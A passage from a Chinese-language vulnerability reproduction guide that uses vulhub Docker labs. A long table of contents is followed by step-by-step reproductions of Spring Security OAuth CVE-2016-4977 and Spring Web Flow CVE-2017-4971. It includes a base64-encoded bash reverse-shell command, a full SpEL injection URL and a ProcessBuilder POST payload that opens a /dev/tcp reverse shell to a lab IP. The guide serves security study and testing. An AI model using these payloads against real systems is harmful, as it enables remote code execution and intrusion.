* [框架漏洞复现](#框架漏洞复现)
  * [spring漏洞复现](#spring漏洞复现)
    * [SpringSecurityOauth RCE (CVE\-2016\-4977)](#springsecurityoauth-rce-cve-2016-4977)
      * [漏洞简述](#漏洞简述)
      * [影响版本](#影响版本)
      * [环境搭建](#环境搭建)
      * [漏洞复现](#漏洞复现)
    * [Spring Web Flow(CVE\-2017\-4971)远程代码执行](#spring-web-flowcve-2017-4971远程代码执行)
      * [漏洞简述](#漏洞简述-1)
      * [影响版本](#影响版本-1)
      * [环境搭建](#环境搭建-1)
      * [漏洞复现](#漏洞复现-1)
    * [Spring Data Rest 远程命令执行漏洞复现(CVE\-2017\-8046)](#spring-data-rest-远程命令执行漏洞复现cve-2017-8046)
      * [漏洞简述](#漏洞简述-2)
      * [影响版本](#影响版本-2)
      * [环境搭建](#环境搭建-2)
      * [漏洞复现](#漏洞复现-2)
    * [Spring Messaging 远程命令执行漏洞（CVE\-2018\-1270）](#spring-messaging-远程命令执行漏洞cve-2018-1270)
      * [漏洞简述](#漏洞简述-3)
      * [影响版本](#影响版本-3)
      * [环境搭建](#环境搭建-3)
      * [漏洞复现](#漏洞复现-3)
    * [Spring Data Commons 远程命令执行漏洞（CVE\-2018\-1273）](#spring-data-commons-远程命令执行漏洞cve-2018-1273)
      * [漏洞简述](#漏洞简述-4)
      * [影响版本](#影响版本-4)
      * [环境搭建](#环境搭建-4)
      * [漏洞复现](#漏洞复现-4)
  * [Laravel漏洞复现](#laravel漏洞复现)
    * [Laravel 远程代码执行漏洞(CVE\-2021\-3129)](#laravel-远程代码执行漏洞cve-2021-3129)
      * [漏洞简述](#漏洞简述-5)
      * [影响版本](#影响版本-5)
      * [环境搭建](#环境搭建-5)
      * [漏洞复现](#漏洞复现-5)
      * [漏洞修复](#漏洞修复)
  * [Sturts2漏洞复现](#sturts2漏洞复现)
    * [Struts2\-001远程代码执行漏洞(CVE\-2007\-4556)](#struts2-001远程代码执行漏洞cve-2007-4556)
      * [漏洞简述](#漏洞简述-6)
      * [影响版本](#影响版本-6)
      * [漏洞复现](#漏洞复现-6)
        * [漏洞利用代码](#漏洞利用代码)
      * [漏洞建议](#漏洞建议)
    * [Struts2\-005远程代码执行漏洞(CVE\-2010\-1870)](#struts2-005远程代码执行漏洞cve-2010-1870)
      * [漏洞简介](#漏洞简介)
      * [影响版本](#影响版本-7)
      * [漏洞复现](#漏洞复现-7)
        * [漏洞利用代码(无回显)](#漏洞利用代码无回显)
        * [漏洞利用代码(有回显)](#漏洞利用代码有回显)
      * [漏洞修复](#漏洞修复-1)
    * [Struts2\-007远程代码执行漏洞(CVE\-2012\-0838)](#struts2-007远程代码执行漏洞cve-2012-0838)
      * [漏洞简介](#漏洞简介-1)
      * [影响版本](#影响版本-8)
      * [漏洞复现](#漏洞复现-8)
        * [漏洞利用代码](#漏洞利用代码-1)
      * [漏洞修复](#漏洞修复-2)
    * [Struts2\-008远程代码执行漏洞(CVE\-2012\-0392)](#struts2-008远程代码执行漏洞cve-2012-0392)
      * [漏洞简介](#漏洞简介-2)
      * [影响版本](#影响版本-9)
      * [漏洞复现](#漏洞复现-9)
        * [漏洞利用代码](#漏洞利用代码-2)
      * [漏洞修复](#漏洞修复-3)
    * [Struts2\-009远程代码执行漏洞(CVE\-2011\-3923)](#struts2-009远程代码执行漏洞cve-2011-3923)
      * [漏洞简介](#漏洞简介-3)
      * [影响版本](#影响版本-10)
      * [漏洞复现](#漏洞复现-10)
        * [漏洞利用代码](#漏洞利用代码-3)
      * [漏洞修复](#漏洞修复-4)
    * [Struts2\-012远程代码执行漏洞(CVE\-2013\-1965)](#struts2-012远程代码执行漏洞cve-2013-1965)
      * [漏洞简介](#漏洞简介-4)
      * [影响版本](#影响版本-11)
      * [漏洞复现](#漏洞复现-11)
        * [漏洞利用代码](#漏洞利用代码-4)
      * [漏洞修复](#漏洞修复-5)
    * [Struts2\-013/14远程代码执行漏洞(CVE\-2013\-1966/CVE\-2013\-2115)](#struts2-01314远程代码执行漏洞cve-2013-1966cve-2013-2115)
      * [漏洞简介](#漏洞简介-5)
      * [影响版本](#影响版本-12)
      * [漏洞复现](#漏洞复现-12)
        * [漏洞利用代码](#漏洞利用代码-5)
      * [漏洞修复](#漏洞修复-6)
    * [Struts2\-015远程代码执行漏洞(CVE\-2013\-2135, CVE\-2013\-2134)](#struts2-015远程代码执行漏洞cve-2013-2135-cve-2013-2134)
      * [漏洞简介](#漏洞简介-6)
      * [影响版本](#影响版本-13)
      * [漏洞复现](#漏洞复现-13)
        * [漏洞利用代码](#漏洞利用代码-6)
      * [漏洞修复](#漏洞修复-7)
    * [Struts2\-016远程代码执行漏洞(CVE\-2013\-2251)](#struts2-016远程代码执行漏洞cve-2013-2251)
      * [漏洞简介](#漏洞简介-7)
      * [影响版本](#影响版本-14)
      * [漏洞复现](#漏洞复现-14)
        * [漏洞利用代码](#漏洞利用代码-7)
      * [漏洞修复](#漏洞修复-8)
    * [Sturts2\-032远程代码执行漏洞(CVE\-2016\-3081)](#sturts2-032远程代码执行漏洞cve-2016-3081)
      * [漏洞简介](#漏洞简介-8)
      * [影响版本](#影响版本-15)
      * [漏洞复现](#漏洞复现-15)
        * [漏洞利用代码](#漏洞利用代码-8)
      * [漏洞修复](#漏洞修复-9)
    * [Struts2\-0445远程代码执行漏洞(CVE\-2017\-5638)](#struts2-0445远程代码执行漏洞cve-2017-5638)
      * [漏洞简介](#漏洞简介-9)
      * [影响版本](#影响版本-16)
      * [漏洞复现](#漏洞复现-16)
        * [利用代码](#利用代码)
        * [Python漏洞验证脚本](#python漏洞验证脚本)
        * [Python漏洞利用脚本](#python漏洞利用脚本)
      * [漏洞修复](#漏洞修复-10)
    * [Struts2\-046远程代码执行漏洞（CVE\-2017\-5638）](#struts2-046远程代码执行漏洞cve-2017-5638)
      * [漏洞简介](#漏洞简介-10)
      * [影响版本](#影响版本-17)
      * [漏洞复现](#漏洞复现-17)
        * [漏洞利用代码](#漏洞利用代码-9)
        * [Python漏洞验证脚本](#python漏洞验证脚本-1)
        * [Python漏洞利用脚本](#python漏洞利用脚本-1)
      * [漏洞修复](#漏洞修复-11)
    * [struts2\-048 远程代码执行(CVE\-2017\-9791）](#struts2-048-远程代码执行cve-2017-9791)
      * [漏洞简介](#漏洞简介-11)
      * [影响版本](#影响版本-18)
      * [漏洞复现](#漏洞复现-18)
        * [漏洞利用代码1](#漏洞利用代码1)
        * [漏洞利用代码2](#漏洞利用代码2)
        * [Python漏洞验证脚本](#python漏洞验证脚本-2)
        * [Python漏洞利用脚本](#python漏洞利用脚本-2)
      * [漏洞修复](#漏洞修复-12)
    * [Struts2\-052远程代码执行漏洞(CVE\-2017\-9805)](#struts2-052远程代码执行漏洞cve-2017-9805)
      * [漏洞简介](#漏洞简介-12)
      * [影响版本](#影响版本-19)
      * [漏洞复现](#漏洞复现-19)
        * [Python漏洞验证代码](#python漏洞验证代码)
      * [Python漏洞利用代码(无回显执行命令)](#python漏洞利用代码无回显执行命令)
      * [漏洞修复](#漏洞修复-13)
    * [Struts2\-053远程代码执行漏洞(CVE\-2017\-12611)](#struts2-053远程代码执行漏洞cve-2017-12611)
      * [漏洞简介](#漏洞简介-13)
      * [影响版本](#影响版本-20)
      * [漏洞复现](#漏洞复现-20)
        * [漏洞利用代码](#漏洞利用代码-10)
        * [Python漏洞验证代码](#python漏洞验证代码-1)
        * [Python漏洞利用代码](#python漏洞利用代码)
      * [漏洞修复](#漏洞修复-14)
    * [Struts2\-057远程代码执行漏洞 (CVE\-2018\-11776)](#struts2-057远程代码执行漏洞-cve-2018-11776)
      * [漏洞简介](#漏洞简介-14)
      * [影响版本](#影响版本-21)
      * [漏洞复现](#漏洞复现-21)
        * [漏洞利用代码](#漏洞利用代码-11)
        * [Payload漏洞验证脚本](#payload漏洞验证脚本)
        * [Python漏洞利用脚本](#python漏洞利用脚本-3)
      * [漏洞修复](#漏洞修复-15)
    * [Struts2\-059远程代码执行(CVE\-2019\-0230)](#struts2-059远程代码执行cve-2019-0230)
      * [漏洞简介](#漏洞简介-15)
      * [影响版本](#影响版本-22)
      * [漏洞复现](#漏洞复现-22)
        * [漏洞利用代码](#漏洞利用代码-12)
        * [Python漏洞验证脚本](#python漏洞验证脚本-3)
        * [Python漏洞攻击脚本](#python漏洞攻击脚本)
      * [漏洞修复](#漏洞修复-16)
    * [Struts2\-061远程代码执行(CVE\-2020\-17530)](#struts2-061远程代码执行cve-2020-17530)
      * [漏洞简介](#漏洞简介-16)
      * [影响版本](#影响版本-23)
      * [漏洞复现](#漏洞复现-23)
        * [漏洞利用代码](#漏洞利用代码-13)
      * [漏洞修复](#漏洞修复-17)
  * [Shiro漏洞复现](#shiro漏洞复现)
    * [CVE\-2016\-4437(Apache Shiro 反序列化漏洞)](#cve-2016-4437apache-shiro-反序列化漏洞)
      * [漏洞描述](#漏洞描述)
      * [漏洞原理](#漏洞原理)
      * [漏洞分析](#漏洞分析)
      * [漏洞特征](#漏洞特征)
      * [影响版本](#影响版本-24)
      * [环境搭建](#环境搭建-6)
        * [Linux环境](#linux环境)
        * [Windows环境](#windows环境)
      * [漏洞复现](#漏洞复现-24)
        * [Linux出网环境渗透Shiro反序列化漏洞](#linux出网环境渗透shiro反序列化漏洞)
        * [Linux不出网环境渗透shiro反序列化漏洞](#linux不出网环境渗透shiro反序列化漏洞)
        * [Windows环境渗透Shiro反序列化漏洞](#windows环境渗透shiro反序列化漏洞)
    * [CVE\-2020\-11989：Apache Shiro权限绕过复现](#cve-2020-11989apache-shiro权限绕过复现)
      * [漏洞简述](#漏洞简述-7)
      * [影响版本](#影响版本-25)
      * [漏洞拦截器](#漏洞拦截器)
      * [环境搭建](#环境搭建-7)
      * [漏洞复现](#漏洞复现-25)
      * [漏洞总结](#漏洞总结)
    * [Apache Shiro 认证绕过漏洞（CVE\-2020\-1957）](#apache-shiro-认证绕过漏洞cve-2020-1957)
      * [漏洞简介](#漏洞简介-17)
      * [影响版本](#影响版本-26)
      * [环境搭建](#环境搭建-8)
      * [漏洞复现](#漏洞复现-26)
    * [漏洞总结](#漏洞总结-1)
  * [Thinkphp漏洞复现](#thinkphp漏洞复现)
    * [ThinkPHP 2\.x 任意代码执行漏洞](#thinkphp-2x-任意代码执行漏洞)
      * [漏洞简述](#漏洞简述-8)
      * [影响版本](#影响版本-27)
      * [环境搭建](#环境搭建-9)
      * [漏洞复现](#漏洞复现-27)
    * [Thinkphp5\-5\.0\.22 / 5\.1\.29远程执行代码漏洞](#thinkphp5-5022--5129远程执行代码漏洞)
      * [漏洞简述](#漏洞简述-9)
      * [影响版本](#影响版本-28)
      * [环境搭建](#环境搭建-10)
    * [ThinkPHP5 5\.0\.23远程执行代码漏洞](#thinkphp5-5023远程执行代码漏洞)
      * [漏洞简述](#漏洞简述-10)
      * [影响版本](#影响版本-29)
      * [环境搭建](#环境搭建-11)
      * [漏洞复现](#漏洞复现-28)
    * [ThinkPHP5 SQL注入漏洞和敏感信息泄露漏洞](#thinkphp5-sql注入漏洞和敏感信息泄露漏洞)
      * [漏洞简介](#漏洞简介-18)
      * [影响版本](#影响版本-30)
      * [环境搭建](#环境搭建-12)
      * [漏洞复现](#漏洞复现-29)
* [数据库漏洞复现](#数据库漏洞复现)
  * [Mongodb漏洞复现](#mongodb漏洞复现)
    * [Mongodb未授权访问](#mongodb未授权访问)
      * [漏洞简介](#漏洞简介-19)
      * [漏洞成因](#漏洞成因)
      * [环境搭建](#环境搭建-13)
      * [漏洞复现](#漏洞复现-30)
        * [MSF漏洞验证](#msf漏洞验证)
      * [漏洞修复](#漏洞修复-18)
  * [redis漏洞复现](#redis漏洞复现)
    * [Redis未授权访问](#redis未授权访问)
      * [漏洞简介](#漏洞简介-20)
      * [影响版本](#影响版本-31)
      * [实验环境](#实验环境)
      * [环境搭建](#环境搭建-14)
      * [漏洞复现](#漏洞复现-31)
        * [方法一：利用redis写webshell](#方法一利用redis写webshell)
        * [方法二：利用redis写入ssh公钥实现免密登录](#方法二利用redis写入ssh公钥实现免密登录)
        * [方法三：利用crontab反弹Shell](#方法三利用crontab反弹shell)
        * [方法四：利用主从复制RCE](#方法四利用主从复制rce)
      * [漏洞修复](#漏洞修复-19)
  * [Mysql漏洞复现](#mysql漏洞复现)
    * [Mysql 身份认证绕过漏洞(CVE\-2012\-2122)](#mysql-身份认证绕过漏洞cve-2012-2122)
      * [漏洞简介](#漏洞简介-21)
      * [影响版本](#影响版本-32)
      * [环境搭建](#环境搭建-15)
      * [漏洞复现](#漏洞复现-32)
        * [bash脚本攻击](#bash脚本攻击)
        * [python脚本攻击](#python脚本攻击)
      * [漏洞修复](#漏洞修复-20)
* [中间件漏洞复现](#中间件漏洞复现)
  * [tomcat漏洞复现](#tomcat漏洞复现)
    * [tomcat 弱口令Getshell](#tomcat-弱口令getshell)
      * [漏洞描述](#漏洞描述-1)
      * [影响版本](#影响版本-33)
      * [环境搭建](#环境搭建-16)
      * [漏洞复现](#漏洞复现-33)
      * [漏洞修复](#漏洞修复-21)
    * [Tomcat 任意文件写入（CVE\-2017\-12615）](#tomcat-任意文件写入cve-2017-12615)
      * [漏洞简述](#漏洞简述-11)
      * [影响版本](#影响版本-34)
      * [利用条件](#利用条件)
      * [环境搭建](#环境搭建-17)
      * [漏洞复现](#漏洞复现-34)
      * [漏洞修复](#漏洞修复-22)
    * [tomcat AJP 任意文件读取/包含漏洞（CVE\-2020\-1938）](#tomcat-ajp-任意文件读取包含漏洞cve-2020-1938)
      * [漏洞简述](#漏洞简述-12)
      * [影响版本](#影响版本-35)
      * [环境搭建](#环境搭建-18)
      * [漏洞复现](#漏洞复现-35)
      * [漏洞修复](#漏洞修复-23)
    * [tomcat 反序列化 （CVE\-2020\-9484）](#tomcat-反序列化-cve-2020-9484)
      * [漏洞简述](#漏洞简述-13)
      * [影响版本](#影响版本-36)
      * [环境搭建](#环境搭建-19)
      * [漏洞复现](#漏洞复现-36)
      * [漏洞修复](#漏洞修复-24)
  * [Jboss漏洞复现](#jboss漏洞复现)
    * [Administration Console 弱口令](#administration-console-弱口令)
      * [漏洞简介](#漏洞简介-22)
      * [影响版本](#影响版本-37)
      * [漏洞验证](#漏洞验证)
      * [漏洞复现](#漏洞复现-37)
      * [漏洞修复](#漏洞修复-25)
    * [JMX Console 未授权访问漏洞](#jmx-console-未授权访问漏洞)
      * [漏洞简介](#漏洞简介-23)
      * [影响版本](#影响版本-38)
      * [漏洞验证](#漏洞验证-1)
      * [漏洞复现](#漏洞复现-38)
      * [漏洞修复](#漏洞修复-26)
    * [JBoss EJBInvokerServlet 反序列化漏洞（CVE\-2013\-4810）](#jboss-ejbinvokerservlet-反序列化漏洞cve-2013-4810)
      * [漏洞简介](#漏洞简介-24)
      * [影响版本](#影响版本-39)
      * [漏洞检测](#漏洞检测)
      * [漏洞利用](#漏洞利用)
      * [漏洞修复](#漏洞修复-27)
    * [jboss 反序列化 （CVE\-2015\-7501）](#jboss-反序列化-cve-2015-7501)
      * [漏洞简介](#漏洞简介-25)
      * [影响版本](#影响版本-40)
      * [环境搭建](#环境搭建-20)
      * [漏洞检测](#漏洞检测-1)
      * [漏洞复现](#漏洞复现-39)
      * [漏洞修复](#漏洞修复-28)
    * [jboss 反序列化 （CVE\-2017\-7504）](#jboss-反序列化-cve-2017-7504)
      * [漏洞简介](#漏洞简介-26)
      * [影响版本](#影响版本-41)
      * [环境搭建](#环境搭建-21)
      * [漏洞复现](#漏洞复现-40)
      * [漏洞修复](#漏洞修复-29)
    * [Jboss 代码执行 (CVE\-2017\-12149)](#jboss-代码执行-cve-2017-12149)
      * [漏洞简介](#漏洞简介-27)
      * [影响版本](#影响版本-42)
      * [环境搭建](#环境搭建-22)
      * [漏洞验证](#漏洞验证-2)
      * [漏洞修复](#漏洞修复-30)
  * [Apache漏洞复现](#apache漏洞复现)
    * [Apache HTTPD 多后缀解析漏洞](#apache-httpd-多后缀解析漏洞)
      * [漏洞简述](#漏洞简述-14)
      * [漏洞原理](#漏洞原理-1)
      * [影响版本](#影响版本-43)
      * [环境搭建](#环境搭建-23)
      * [漏洞复现](#漏洞复现-41)
    * [Apache SSI 远程命令执行漏洞](#apache-ssi-远程命令执行漏洞)
      * [漏洞简述](#漏洞简述-15)
      * [利用条件](#利用条件-1)
      * [环境搭建](#环境搭建-24)
      * [漏洞复现](#漏洞复现-42)
    * [Apache 解析漏洞（CVE\-2017\-15715）](#apache-解析漏洞cve-2017-15715)
      * [漏洞简介](#漏洞简介-28)
      * [影响版本](#影响版本-44)
      * [环境搭建](#环境搭建-25)
      * [漏洞复现](#漏洞复现-43)
    * [Apache HTTP Server 2\.4\.48 mod\_proxy SSRF漏洞（CVE\-2021\-40438）](#apache-http-server-2448-mod_proxy-ssrf漏洞cve-2021-40438)
      * [漏洞简述](#漏洞简述-16)
      * [影响版本](#影响版本-45)
      * [环境搭建](#环境搭建-26)
      * [漏洞复现](#漏洞复现-44)
    * [Apache\_path Traversal(CVE\-2021\-41773/CVE\-2021\-42013)](#apache_path-traversalcve-2021-41773cve-2021-42013)
      * [漏洞简述](#漏洞简述-17)
      * [影响版本](#影响版本-46)
      * [环境搭建](#环境搭建-27)
      * [漏洞复现](#漏洞复现-45)
        * [Curl](#curl)
          * [读取文件](#读取文件)
          * [执行命令](#执行命令)
        * [MSF](#msf)
          * [漏洞验证](#漏洞验证-3)
          * [漏洞利用](#漏洞利用-1)
      * [Pocsuite3利用脚本](#pocsuite3利用脚本)
      * [漏洞修复](#漏洞修复-31)
  * [Nginx漏洞复现](#nginx漏洞复现)
    * [Nginx 文件名逻辑漏洞（CVE\-2013\-4547）](#nginx-文件名逻辑漏洞cve-2013-4547)
      * [漏洞简述](#漏洞简述-18)
      * [漏洞原理](#漏洞原理-2)
      * [影响版本](#影响版本-47)
      * [环境搭建](#环境搭建-28)
      * [漏洞复现](#漏洞复现-46)
    * [Nginx越界读取缓存漏洞（CVE\-2017\-7529）](#nginx越界读取缓存漏洞cve-2017-7529)
      * [漏洞简述](#漏洞简述-19)
      * [影响版本](#影响版本-48)
      * [环境搭建](#环境搭建-29)
      * [漏洞复现](#漏洞复现-47)
    * [Nginx 解析漏洞复现](#nginx-解析漏洞复现)
      * [漏洞简述](#漏洞简述-20)
      * [影响版本](#影响版本-49)
      * [环境搭建](#环境搭建-30)
      * [漏洞复现](#漏洞复现-48)
  * [IIS漏洞复现](#iis漏洞复现)
      * [IIS6](#iis6)
        * [IIS 6\.0解析漏洞](#iis-60解析漏洞)
          * [漏洞简介](#漏洞简介-29)
          * [影响版本](#影响版本-50)
          * [环境搭建](#环境搭建-31)
          * [漏洞复现](#漏洞复现-49)
        * [IIS6\.0远程代码执行漏洞复现（CVE\-2017\-7269）](#iis60远程代码执行漏洞复现cve-2017-7269)
          * [漏洞简述](#漏洞简述-21)
          * [影响版本](#影响版本-51)
          * [<strong>环境搭建</strong>](#环境搭建-32)
          * [漏洞复现](#漏洞复现-50)
      * [IIS7](#iis7)
        * [IIS 7&amp;IIS 7\.5解析漏洞](#iis-7iis-75解析漏洞)
        * [<strong>HTTP\.SYS远程代码执行（MS15\-034）</strong>](#httpsys远程代码执行ms15-034)
  * [Weblogic漏洞复现](#weblogic漏洞复现)
    * [XMLDecoder 反序列化漏洞（CVE\-2017\-10271 &amp; CVE\-2017\-3506）](#xmldecoder-反序列化漏洞cve-2017-10271--cve-2017-3506)
      * [漏洞简介](#漏洞简介-30)
      * [影响版本](#影响版本-52)
      * [环境搭建](#环境搭建-33)
      * [漏洞复现](#漏洞复现-51)
    * [wls\-wsat反序列化远程代码执行漏洞（CVE\-2019\-2725）](#wls-wsat反序列化远程代码执行漏洞cve-2019-2725)
      * [漏洞简介](#漏洞简介-31)
      * [影响版本](#影响版本-53)
      * [环境搭建](#环境搭建-34)
      * [漏洞存在](#漏洞存在)
      * [漏洞复现](#漏洞复现-52)
    * [WLS Core Components 反序列化命令执行漏洞（CVE\-2018\-2628）](#wls-core-components-反序列化命令执行漏洞cve-2018-2628)
      * [漏洞简介](#漏洞简介-32)
      * [影响版本](#影响版本-54)
      * [环境搭建](#环境搭建-35)
      * [漏洞复现](#漏洞复现-53)
    * [Weblogic 任意文件上传漏洞（CVE\-2018\-2894）](#weblogic-任意文件上传漏洞cve-2018-2894)
      * [漏洞简介](#漏洞简介-33)
      * [影响版本](#影响版本-55)
      * [环境搭建](#环境搭建-36)
      * [漏洞复现](#漏洞复现-54)
    * [Weblogic SSRF漏洞（CVE\-2014\-4210）](#weblogic-ssrf漏洞cve-2014-4210)
      * [漏洞简介](#漏洞简介-34)
      * [影响版本](#影响版本-56)
      * [环境搭建](#环境搭建-37)
      * [漏洞复现](#漏洞复现-55)
    * [Weblogic 弱口令 &amp;&amp; 后台getshell](#weblogic-弱口令--后台getshell)
      * [漏洞简介](#漏洞简介-35)
      * [影响版本](#影响版本-57)
      * [环境搭建](#环境搭建-38)
      * [漏洞复现](#漏洞复现-56)
    * [Weblogic Console HTTP协议远程代码执行漏洞（CVE\-2020\-14882/3）](#weblogic-console-http协议远程代码执行漏洞cve-2020-148823)
      * [漏洞简介](#漏洞简介-36)
      * [影响版本](#影响版本-58)
      * [环境搭建](#环境搭建-39)
      * [漏洞复现](#漏洞复现-57)
  * [WebSphere漏洞复现](#websphere漏洞复现)
    * [Java反序列化(CVE\-2015\-7450）](#java反序列化cve-2015-7450)
      * [漏洞简述](#漏洞简述-22)
      * [影响版本](#影响版本-59)
      * [环境搭建](#环境搭建-40)
      * [漏洞复现](#漏洞复现-58)
      * [漏洞修复](#漏洞修复-32)
    * [弱口令 &amp;&amp; 后台Getshell](#弱口令--后台getshell)
      * [漏洞简述](#漏洞简述-23)
      * [影响版本](#影响版本-60)
      * [环境搭建](#环境搭建-41)
      * [漏洞复现](#漏洞复现-59)
      * [漏洞修复](#漏洞修复-33)
  * [Glassfish漏洞复现](#glassfish漏洞复现)
    * [GlassFish 任意文件读取（CVE\-2017\-1000028）](#glassfish-任意文件读取cve-2017-1000028)
      * [漏洞简述](#漏洞简述-24)
      * [影响版本](#影响版本-61)
      * [环境搭建](#环境搭建-42)
      * [漏洞复现](#漏洞复现-60)
      * [漏洞修复](#漏洞修复-34)
    * [GlassFish 后台Getshell](#glassfish-后台getshell)
      * [漏洞简述](#漏洞简述-25)
      * [影响版本](#影响版本-62)
      * [环境搭建](#环境搭建-43)
      * [漏洞复现](#漏洞复现-61)
      * [漏洞修复](#漏洞修复-35)

# 框架漏洞复现

## spring漏洞复现

### SpringSecurityOauth RCE (CVE-2016-4977) 

#### 漏洞简述

```php
Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。
```

#### 影响版本

```php
Spring Security OAuth 1.0.0到1.0.5
Spring Security OAuth 2.0.0到2.0.9
Spring Security OAuth 2.0到2.0.14
Spring Security OAuth 2.1到2.1.1
Spring Security OAuth 2.2到2.2.1
Spring Security OAuth 2.3到2.3.2
```

#### 环境搭建

```php
docker pull vulhub/spring-security-oauth2:2.0.8
docker run -d -p 8080:8080 vulhub/spring-security-oauth2:2.0.8
```

#### 漏洞复现

（1）访问`http://your-ip:8080/`查看首页

![image-20220122183549919](image/image-20220122183549919.png)

（2）访问http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test，这里输入admin/admin用户名和密码，SpEL 表达式`${233*233}`已成功执行并返回结果

```python3
http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test
```

![image-20220122183648978](image/image-20220122183648978.png)

（3）然后，我们使用[poc.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)来生成反弹shell的POC（注意：[Java反弹shell的限制与绕过方式](http://www.jackson-t.ca/runtime-exec-payloads.html)）：

POC下载地址：https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py

```php
python3 poc.py
输入反弹Shell语句：bash -c {echo,YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguMjA4LjIvNjY2NiA8JjE=}|{base64,-d}|{bash,-i}
```

![image-20220122184232190](image/image-20220122184232190.png)

（4）生成了一大串SpEL语句。附带上这个SpEL语句，访问成功弹回shell：

```php
http://your-ip:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}
```

![image-20220122184703565](image/image-20220122184703565.png)





------

### Spring Web Flow(CVE-2017-4971)远程代码执行

#### 漏洞简述

```php
  Spring Web Flow发布了更新补丁修复了一个Spring Web Flow 在数据绑定上存在的一个漏洞（CVE-2017-4971, CNNVD-201706-147）。该漏洞源于在Model的数据绑定上没有指定相关model的具体属性，从而导致恶意的表达式可以通过表单提交并且被执行，导致远程代码执行。
```

#### 影响版本

```php
Spring WebFlow 2.4.0 - 2.4.4
```

#### 环境搭建

```php
docker pull vulhub/spring-webflow:2.4.4
docker run -d -p 8080:8080 vulhub/spring-webflow:2.4.4
```

#### 漏洞复现

（1）访问`http://your-ip:8080/login`，用左边任意一个用户名密码登录

![image-20220122185002703](image/image-20220122185002703.png)

（2）访问`http://your-ip:8080/hotels/1`，点击预订按钮"Book Hotel"，填写相关信息后点击"Process"(从这一步，其实WebFlow就正式开始了)

![image-20220122185221753](image/image-20220122185221753.png)

再点击确认“Confirm”：

![image-20220122185318743](image/image-20220122185318743-164284879947629.png)

此时用burpsuite抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：

```
编码前：
_eventId_confirm=&_csrf=f41fe5b9-f190-4fac-ad7b-cf6f56dc363c&_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/192.168.224.1/8888 0>&1")).start()=vulhub

编码后：
_eventId_confirm=&_csrf=f41fe5b9-f190-4fac-ad7b-cf6f56dc363c&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.224.1/8888+0>%261")).start()=vulhub
```

![image-20220122213111449](image/image-20220122213111449.png)



------

### Spring Data Rest 远程命令执行漏洞复现(CVE-2017-8046)

#### 漏洞简述

```php
